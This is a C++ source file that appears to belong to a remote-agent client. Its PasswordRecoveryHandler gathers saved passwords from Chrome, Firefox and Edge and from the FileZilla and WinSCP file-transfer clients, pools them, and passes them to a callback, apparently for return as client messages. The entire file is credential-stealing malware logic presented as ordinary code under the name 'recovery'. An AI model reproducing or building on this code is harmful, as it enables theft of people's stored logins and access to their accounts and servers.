#include "PasswordRecoveryHandler.h"
#include "ChromePassReader.h"
#include "FirefoxPassReader.h"
#include "EdgePassReader.h"
#include "FileZillaPassReader.h"
#include "WinScpPassReader.h"
#include <iostream>

namespace rslm {
    namespace client {
        namespace messages {

            void PasswordRecoveryHandler::RecoverBrowsers(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                std::cout << "[Agent] Reading Chrome passwords..." << std::endl;
                recovery::ChromePassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    std::cout << "[Agent] Chrome found " << p.size() << " passwords" << std::endl;
                    all.insert(all.end(), p.begin(), p.end());
                    });

                std::cout << "[Agent] Reading Firefox passwords..." << std::endl;
                recovery::FirefoxPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    std::cout << "[Agent] Firefox found " << p.size() << " passwords" << std::endl;
                    all.insert(all.end(), p.begin(), p.end());
                    });

                std::cout << "[Agent] Reading Edge passwords..." << std::endl;
                recovery::EdgePassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    std::cout << "[Agent] Edge found " << p.size() << " passwords" << std::endl;
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
                std::cout << "[Agent] Total passwords found: " << all.size() << std::endl;
            }

            void PasswordRecoveryHandler::RecoverFtpClients(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                std::cout << "[Agent] Reading FileZilla passwords..." << std::endl;
                recovery::FileZillaPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    std::cout << "[Agent] FileZilla found " << p.size() << " passwords" << std::endl;
                    all.insert(all.end(), p.begin(), p.end());
                    });

                std::cout << "[Agent] Reading WinSCP passwords..." << std::endl;
                recovery::WinScpPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    std::cout << "[Agent] WinSCP found " << p.size() << " passwords" << std::endl;
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
                std::cout << "[Agent] Total FTP passwords found: " << all.size() << std::endl;
            }

            void PasswordRecoveryHandler::RecoverAll(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                RecoverBrowsers([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });
                RecoverFtpClients([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
                std::cout << "[Agent] Total all passwords found: " << all.size() << std::endl;
            }

        } // namespace messages
    } // namespace client
} // namespace rslm